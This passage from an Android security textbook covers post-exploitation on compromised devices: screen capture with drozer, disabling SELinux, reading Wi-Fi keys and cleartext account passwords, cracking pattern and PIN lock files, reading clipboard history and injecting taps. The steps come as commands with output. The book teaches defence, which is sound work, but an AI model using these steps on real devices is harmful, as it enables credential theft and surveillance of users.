device using the screencap binary. This standard binary is available on Android and allows the screen's
framebuffer to be read and saved as a PNG file. Look back at that Samsung Service Mode Application exploit
performed earlier that exploited the application to inject drozer, which then runs as the system user. Inside the
drozer shell, even though you don't have Context you are able to generate a screenshot of the device as follows:
dz-limited> run post.capture.screenshot
[+] Done. Saved at /home/tyrone/1416173613.png
This module also opens the screenshot automatically in your default picture viewer on your computer. Doing
this is possible because you are running as the system user. This user, as well as the shell and root users, can
perform this action. This module can be used alongside an installed version of minimal su that ensures the user
is not prompted when requesting a root shell.
You can also create video recordings of the screen. A standard binary available on Android devices named
screenrecord allows you to do this. This example uses the Nexus 7 device running Android 5.0 Lollipop. A
previous example showed how to install a rogue drozer agent on the device. However, using this binary requires
system, shell, or root access on the device. At the time of writing, no publicly available vulnerability allowed us
this access from a normally installed application. If you dig deeper into the device you may notice that the user
has rooted it. Possibly if the user accepts the root manager prompt you would be able to obtain further root
access on the device. If this happened, you could run the screenrecord binary, which is wrapped conveniently in
a drozer module at post.capture.screenrecording. Running this module to record for 10 seconds returns the
following:
dz> run post.capture.screenrecording -l 10
[-] You are not a privileged user and no minimal su binary available
(see tools.setup.minimalsu).
It tells you that you are not in a position to use this module because it does not consider prompting the user for
root as a valid way of obtaining root. To override this behavior, add the --override-checks flags to the module.
When you do this you get the following:
dz> run post.capture.screenrecording -l 10 --override-checks
[-] You are not a privileged user and no minimal su binary available
(see tools.setup.minimalsu).
[*] Continuing...
It continues and tries to execute the command using su. After a while it seems to hang at this output because of
SELinux not allowing the root user to copy a file into drozer's directory. This is confirmed by the following
entries in logcat:
I/ServiceManager(13131): Waiting for service SurfaceFlinger...
E/ServiceManager( 126): SELinux: getpidcon(pid=13131) failed to
retrieve pid context.
E/ServiceManager( 126): find_service('SurfaceFlinger') uid=0 -
PERMISSION DENIED
W/servicemanager( 126): type=1400 audit(0.0:114): avc: denied { search
} for name="13131" dev=proc ino=178268 scontext=u:r:servicemanager:s0
tcontext=u:r:init:s0 tclass=dir
You can issue getenforce and check the status of SELinux on the device:
dz> !getenforce
Enforcing
With root access you can turn SELinux off by placing it in Permissive mode as follows:
dz> !su -c setenforce Permissive
dz> !getenforce
Permissive
Running the module again reveals that it works:
dz>> run post.capture.screenrecording -l 10 --override-checks
[-] You are not a privileged user and no minimal su binary available
(see tools.setup.minimalsu).
[*] Continuing...
[+] Done. Saved at /home/tyrone/1416174087.mp4
Figure 8.12 shows a still frame of the recording where the user's lock screen pattern was captured.
Figure 8.12 A screen recording of capturing the user's lock screen pattern
Stealing Files from SD Card
The SD card can contain all kinds of juicy files stored by the user. On Android version 4.3 and earlier, any form
of code running a device would be able to access the SD card. On Android 4.4 and later it requires the
compromise or installation of an application holding the READ_EXTERNAL_STORAGE permission. No Context is
required to read the SD card because this access is mapped as a Linux group. Browse the SD card in drozer by
using the shell as follows:
dz> shell
u0_a275@jflte:/data/data/com.mwr.dz $ cd /sdcard
u0_a275@jflte:/sdcard $ ls -la
drwxrwx--- root sdcard_r 2014-01-01 02:01 Alarms
drwxrwx--x root sdcard_r 2014-06-30 18:56 Android
drwxrwx--- root sdcard_r 2014-07-22 18:55 Application
drwxrwx--- root sdcard_r 2014-09-20 13:09 DCIM
drwxrwx--- root sdcard_r 2014-01-01 02:01 Documents
drwxrwx--- root sdcard_r 2014-10-20 20:26 Download
...
To download files from the SD card you use the tools.file.download module.
Other Techniques for Privileged Scenarios
This section presents some general techniques that can be used when privileged access has been gained by an
attacker. It also covers some post-exploitation techniques that would interest attackers with physical access to a
device.
Extracting Wi-Fi Keys
The Wi-Fi passwords of all saved hotspots are stored on an Android device at
/data/misc/wifi/wpa_supplicant.conf. The following shows the file permissions set on this file on a Nexus 7
running Android 5.0:
root@grouper:/ # ls -l /data/misc/wifi/wpa_supplicant.conf
-rw-rw---- system wifi 363 2014-11-15 16:01 wpa_supplicant.conf
This means that system or root user access is required to obtain this file. The group is not mapped to any
permission in the /system/etc/permissions/platform.xml file and therefore not attainable by third-party
applications. The following shows that the device had only a single saved network on it:
root@grouper:/ # cat /data/misc/wifi/wpa_supplicant.conf
...
network={
ssid="FileName_MyWifiHotspot"
psk="my@mAz1ngP@$$w0rD"
key_mgmt=WPA-PSK
priority=3
}
User Accounts
Unavoidably, some user accounts will be stored in cleartext on the device. Applications like Gmail make sure
never to store the password in cleartext but rather use a password token. However, a regular email client has to
connect to a POP3 and SMTP server and provide the actual password, so storing it somewhere is necessary.
Accounts on the device are stored in /data/system/users/0/accounts.db. The file permissions on this file are as
follows:
root@grouper:/ # ls -l /data/system/users/0/accounts.db
-rw-rw---- system system 65536 2014-11-15 16:18 accounts.db
To obtain this file an attacker would need system or root access. Downloading this file and opening it with
sqlite3 is shown here:
$ sqlite3 accounts.db
...
sqlite> .headers on
sqlite> .tables
accounts authtokens grants shared_accounts
android_metadata extras meta
...
sqlite> select * from accounts;
_id|name|type|password|previous_name
1|PI:EMAIL|com.google.android.gm.pop3|str0ngP@$$w0rd123|
Cracking Patterns, PINs, and Passwords
If obtaining the /data/system/gesture.key file when the device is using a pattern lock screen or
/data/system/password.key when the device is using a PIN or password is possible, then the lock screen code
can be cracked. These files are only readable and writable by the system user and so having this access or higher
is a prerequisite.
For cracking a pattern lock, the only requirement is to obtain the gesture .key file. Various tools can crack this
file but you can find a nice visual one at https://github.com/sch3m4/androidpatternlock.Providing the
obtained gesture.key as input to this tool looks as follows:
$ python crack.pattern.py gesture.key
################################
# Android Pattern Lock Cracker #
# v0.1 #
# ---------------------------- #
# Written by Chema Garcia #
# http://safetybits.net #
# PI:EMAIL #
# @sch3m4 #
################################
[i] Taken from: http://forensics.spreitzenbarth.de/2012/02/28/cracking-
the-pattern-lock-on-android/
[+] Checking length 3
[+] Checking length 4
[+] Checking length 5
[:D] The pattern has been FOUND!!! => 01258
[+] Gesture:
----- ----- -----
| 1 | | 2 | | 3 |
----- ----- -----
----- ----- -----
| | | | | 4 |
----- ----- -----
----- ----- -----
| | | | | 5 |
----- ----- -----
This shows the sequence that the pattern lock follows in a visual manner. To crack a PIN or password lock,
password.key is needed as well as the salt used for the hash. The lockscreen.password_salt can be found in
different places depending on the device; however, the following are two common locations:
/data/system/locksettings.db
/data/data/com.android.providers.settings/databases/settings.db
After the appropriate database is discovered to contain lockscreen .password_salt you can extract it as follows:
$ sqlite3 settings.db "select value from secure where name =
'lockscreen.password_salt'"
6286553008896743476
You find the salted hash value of the password at the end of the password .key file and can extract it as follows:
$ tail --bytes 32 password.key
8C10A1204AB6B8E3B7F155A6D7C9251E
After you obtain the salt and the salted hash, you can use one of the many tools available to perform the
cracking. One of the most mature in its space is oclHashcat (see http://hashcat.net/oclhashcat/) and its
variants.
Reading Extended Clipboards
Any application with Context can read a user's clipboard, which may reveal sensitive information, especially if
the user makes use of a password manager. This attack was shown in “Other Communication Mechanisms” in
Chapter 7. It would be better for an attacker to be able to read a history of the last 20 items that were placed on
the clipboard. This would likely reveal various passwords if the user made use of a password manager. Some
device manufacturers, like Samsung, have an extended clipboard feature that does this. It stores the last 20
items in the /data/clipboard/ directory. Here is snipped output of this directory:
shell@jflte:/ $ ls -l /data/clipboard/
drwxrwxr-x system system 2014-11-07 10:13 11191631441356_824_375
drwxrwxr-x system system 2014-11-13 21:03 1120027848334_463_93
drwxrwxr-x system system 2014-11-12 01:43 1129463352437_797_564
drwxrwxr-x system system 2014-11-13 21:19 11307915521940_67_32
drwxrwxr-x system system 2014-11-14 01:42 11310498884247_111_65
drwxrwxr-x system system 2014-11-11 21:35 11669478483512_725_396
...
Listing the directory that was updated most recently reveals the following:
shell@jflte:/ $ ls -l /data/clipboard/11669478483512_725_396/
-rw------- system system 238 2014-11-11 21:35 clip
Each directory has a clip file that is owned by the system user, which means the attacker must have this access
or higher. Retrieving this file and inspecting it reveals that it is not plaintext. Running the file utility against it
shows that it is a serialized Java object:
$ file clip
clip: Java serialization data, version 5
You can use a nifty tool named jdeserialize (see https://code.google.com/p/jdeserialize/) to inspect this
object. Doing so shows that the actual clip value was “Hi there!”:
$ java -jar jdeserialize-1.2.jar -noclasses clip
read: android.sec.clipboard.data.list.ClipboardDataText _h0x7e0003 =
r_0x7e0000;
//// BEGIN stream content output
android.sec.clipboard.data.list.ClipboardDataText _h0x7e0003 =
r_0x7e0000;
//// END stream content output
//// BEGIN instance dump
[instance 0x7e0003:
0x7e0000/android.sec.clipboard.data.list.ClipboardDataText
field data:
0x7e0000/android.sec.clipboard.data.list.ClipboardDataText:
mValue: r0x7e0004: [String 0x7e0004: "Hi there!"]
0x7e0002/android.sec.clipboard.data.ClipboardData:
LOG_LEN: 20
mFormatID: 2
mIsProtected: false
]
//// END instance dump
Again, being able to read clipboards is particularly useful if you know that the owner of the device you
compromised uses a password manager.
Simulating User Interaction
Any post-exploitation techniques requiring a tap on the screen in a particular place, text to be typed in, or some
other user action can likely be done using the input script present on Android devices. Think about any second
factor authentication solutions that require a user to accept a prompt to log in to a VPN or approve a banking
transaction. A technique that allows the attacker to interact with the screen could help bypass the security of
these additional security mechanisms.
Here are the available options for the input script on a KitKat device:
$ adb shell input
Usage: input []  [...]
The sources are:
trackball
joystick
touchnavigation
mouse
keyboard
gamepad
touchpad
dpad
stylus
touchscreen
The commands and default sources are:
text  (Default: touchscreen)
keyevent [–longpress]  ... (Default:
keyboard)
tap   (Default: touchscreen)
swipe     [duration(ms)] (Default: touchscreen)
press (Default: trackball)
roll   (Default: trackball)
To use the input script to tap on the screen, you can run it as follows:
$ adb shell input tap 520 960
This taps exactly in the middle of the screen. To find a screen's dimensions you can use the dumpsys command
and filter by an attribute named mUnrestrictedScreen:
$ adb shell dumpsys window | grep mUnrestrictedScreen
mUnrestrictedScreen=(0,0) 1080x1920
The input script can be used by the shell, system, or root users. It can also be used by applications holding the
INJECT_EVENTS permission; however, this is protected by the signature protection level.
Extracting Application Data with Physical Access
Physical access to a device allows the extraction of user data and potentially sensitive application data through
the use of the ADB backup functionality. Connect the device to your computer and perform the following to
back up all data of applications that do not have the allowBackup manifest attribute set to false, as well as the
SD card:
$ adb backup -all -shared
On the device's screen do not use a password and tap Back Up My Data. This takes a while. Place a backup.ab file
in the current working directory on your computer. You can extract it in the same way presented in Chapter 7,
“Exploiting Misconfigured Package Attributes.”
Summary
This chapter showed the multiple attack vectors that could be used to gain a foothold on a device. It also
explored some post-exploitation activities that could be used to escalate privileges and infiltrate user data. All
the remote exploits presented that allowed initial code execution on the device were due to vulnerabilities in
installed applications, which highlights the importance of developers implementing a secure development
lifecycle, especially if the application is going to be installed on millions of devices. The content presented in this
chapter may seem very offensive by nature. However, these are some of the techniques that a real attacker
would employ to gain access to your device. As a developer or security professional, knowing the types of attacks
that are possible is crucial for fixing or preventing them for the future. Chapter 9 will discuss ways to ensure
that individual applications are secured.
CHAPTER 9
Writing Secure Android Applications
You have explored many different ways to find vulnerabilities in applications and exploit them. This chapter
looks at ways you can prevent these vulnerabilities in your applications by implementing the right security
mechanisms.
Protections against common vulnerabilities such as code injection, logic flaws, insecure storage, application